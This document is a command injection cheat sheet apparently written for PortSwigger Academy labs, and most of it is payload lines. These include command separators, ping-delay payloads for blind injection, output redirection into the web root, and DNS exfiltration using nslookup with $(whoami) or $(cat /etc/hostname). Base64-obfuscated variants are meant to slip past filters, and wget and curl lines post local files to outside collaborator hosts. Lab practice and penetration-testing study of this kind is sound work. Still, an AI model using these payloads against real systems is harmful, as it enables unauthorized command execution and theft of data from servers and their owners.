# Command Injection

## Summary

* [General Recon For Comamnd Injection Vulnerabilities](#recon)

  
* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

  
   * [Obfuscation Related Payloads](#obfuscation-payloads)

<br>

## Resources

* https://portswigger.net/web-security/os-command-injection
* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection

<br>

## Recon

* First step is to perform application mapping and identify any instances where the application appears to be interacting with the underlying OS by calling external processes or accessing the filesystem.  
* The application may issue OS system commands containing any item of user supplied data (every URL, parameters, cookies, etc.).  It’s recommended to probe all these instances for OS Command Injection.

<br>

---
---

## Cheat Sheet

### Background Knowledge

* The characters ; | & and newline(URL encoded -> %0a) can be used to batch multiple commands one after another.  Each of these characters should be used when probing for command injection vulnerabilities, as the application may reject some inputs but accept others.

* The backtick \` character can also be used to encapsulate a separate command within a data item being processed by the original command.  This will cause the interpreter to execute this command first before continuing to execute the remaining command String: 

```bash
nslookup `whoami`.server-you-control.net
```

<br>

* Other useful commands to know:  https://portswigger.net/web-security/os-command-injection#useful-commands

* Ways of injecting OS commands:  https://portswigger.net/web-security/os-command-injection#ways-of-injecting-os-commands

Note:   Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

<br>

### Example

* Many times the injected characters need to be encoded, since they can interfere with the structure of the URL/body parameters.

  * For example, below the & and {space} characters need to be URL encoded (%26 and %20) in order to be treated as part of the injection payload:

![Command Injection](https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/Command%20Injection/Images/CommandInjection-1.png)

<br>

### Simple Command Injection

```bash
& echo test123 &
```

<br>

### Blind Command Injection

* Many times, the results of the injected commands are not returned in the application responses.  If that is the case, we can use the ping command to trigger a time delay in the application’s response by causing the server to ping its loopback interface for a specific time period.

* To maximize chances of identifying OS Command Injection if the application is filtering certain command separators, submit each of the following payloads to each input fields and analyze the time taken for the application to respond:

```bash
| ping -i 30 127.0.0.1 |
```

```bash
| ping -n 30 127.0.0.1 |
```

```bash
& ping -i 30 127.0.0.1 &
```

```bash
& ping -n 30 127.0.0.1 &
```

```bash
; ping -i 30 127.0.0.1 ;
```

```bash
%0a ping -i 30 127.0.0.1 %0a
```

```bash
` ping 127.0.0.1 `
```

<br>

### Output Redirection

* We can also redirect a commands output to a file using the > character.  The below example redirects the output of the OS command to a file <u>within the web root</u>, then we can access the file to view the contents through our browser.

```bash
; whoami > /var/www/images/test;
```

<br>

### Out-of-band channel payloads

#### Network Interaction

```bash
; nslookup server-you-control ;
```

```bash
& nslookup server-you-control &
```

<br>

#### Reverse Shells
* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

<br>

#### DNS Data Exfiltration
* Using backticks \`_command_\` and $(_command_)

```bash
; nslookup $(whoami).server-you-control ;
```

```bash
; nslookup `whoami`.server-you-control ;
```

<br><br><br>

### Obfuscation Payloads:

The goal here was to learn how the following payload can be obfuscated, to bypass filters for data exfiltration.

The payloads can be combined when exploiting Template Injection or other vulnerabilities that use OS Command injection.

<br>

  * Original Payload:
    
```
||nslookup+$(cat+/etc/hostname).fp8v70vp.oastify.com||
```

<br>

  * Obfuscation - Using the "echo" command to help obfuscate the word "hostname"

```
||nslookup+$(cat+/etc/ho`echo+'stname'`).fp8w54v70vp.oastify.com||
```

<br>

  * Obfuscation - Using base64 encoding to "hide" the file name "/etc/hostname"
    
```
||nslookup+$(cat+`echo+'L2V0Yy9ob3N0bmFtZQ=='+|+base64+--decode`).fp8v70vp.oastify.com||
```

  * Decoded payload
```
||nslookup $(cat `echo 'L2V0Yy9ob3N0bmFtZQ==' | base64 --decode`).fp8w70vp.oastify.com||
```

<br>

* Obfuscation - Using base encoding to "hide" the whole command "cat /etc/hostname"

```
||nslookup+$(`echo+'Y2F0IC9ldGMvaG9zdG5hbWU='+|+base64+--decode`).er9v70tk9lz9o.oastify.com||
```

<br><br>

* Other methods to achieve data exfiltration:

```
nslookup -q=cname $(cat /home/test).burp.oastify.com
```

```
wget http://burp-collab.com --post-file=/home/test
```

```
curl http://wcq0jo8.oastify.com -d @/home/test
```

<br><br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet.
